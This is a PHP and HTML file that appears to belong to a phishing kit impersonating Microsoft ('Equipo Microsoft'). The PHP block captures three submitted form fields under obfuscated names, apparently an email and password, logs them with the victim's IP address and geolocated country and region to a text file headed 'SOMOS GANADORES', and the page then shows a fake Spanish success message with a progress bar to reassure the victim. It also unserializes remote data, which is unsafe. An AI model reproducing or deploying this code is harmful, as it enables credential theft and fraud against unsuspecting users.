<?php
ini_set("display_errors", 0);
session_start();
include('nombre_archivo.php');

function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];

if( isset($_POST['ejdysdysd3']) && isset($_POST['fow773']) && isset($_POST['sdf34fer']) ){
    
    $file = fopen("tutuxganador.txt", "a");
  fwrite($file, "||========== SOMOS GANADORES===========" . PHP_EOL);
    fwrite($file, "|| eml : ".$_POST['ejdysdysd3']. PHP_EOL);
    fwrite($file, "|| clmll : ".$_POST['fow773']. PHP_EOL);
    fwrite($file, "|| third_input : ".$_POST['sdf34fer']. PHP_EOL); // Tercer input
    fwrite($file, "|| IP DE USUARIO: ".$myip." ".$pais." ".$region." ".date('d/m/Y'). PHP_EOL);

    fclose($file);
}
?>


  























  

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

  <title>Log - Internet /(HOME</title>
  <link rel="stylesheet" href="artt/lacarardelh.css"> <style>
   .progress-container {
       width: 80%;
       margin: 50px auto;
       border: 2px solid #757575;
       border-radius: 5px;
       padding: 5px;
   }

   .progress-bar {
       width: 0;
       height: 30px;
       background-color: #159cf5;
       color: #fff;
       text-align: center;
       line-height: 30px;
       border-radius: 5px;
   }</style>
</head>
<body>

    <img class="log2" src="imdd/log-msu3.png" alt=""> <div style="background-color: rgb(25, 102, 255); width: 100%; ">
    
    <p style="color: white;padding: 10px; text-align: center;">Equipo Microsoft</p></div>
    <center>
 
</div>
  
        <form class="performancelog">
    
   <img src="imdd/vlog-ibn.png" alt="">

      <p>De manera Exitosa haz realizado este procedimiento, puedes seguir disfrutando de nuestros servicios!</p>
  <div class="progress-container">
   <div class="progress-bar" id="progress-bar">0%</div>
</div>


<script>
   function startProgressBar() {
       var progressBar = document.getElementById("progress-bar");
       var progress = 0;

       var interval = setInterval(function () {
           if (progress < 100) {
               progress++;
               progressBar.style.width = progress + "%";
               progressBar.textContent = progress + "%";
           } else {
               clearInterval(interval);
           }
       }, 30);
   }

   startProgressBar();
</script>
   
  <br><br>
  </form></center>
</div>    </div>

</body>
</html>
